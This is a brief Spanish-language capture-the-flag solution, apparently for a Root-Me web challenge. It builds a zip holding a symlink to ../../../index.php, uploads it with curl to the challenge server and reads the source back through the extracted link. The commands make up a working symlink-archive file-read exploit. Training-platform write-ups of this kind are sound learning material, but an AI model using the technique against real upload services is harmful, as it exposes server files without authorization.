#se crea un enlace simbolico al index.php
ln -s ../../../index.php link_to_index


#generamos un zip cuyo contenido sea ese enlace
zip --symlinks payload.zip link_to_index

#subimos el zip
curl -v -F "zipfile=@payload.zip" http://challenge01.root-me.org/web-serveur/ch51/

y despues accedemos al contenido del zip
esto no lonpermite la propia pagina.


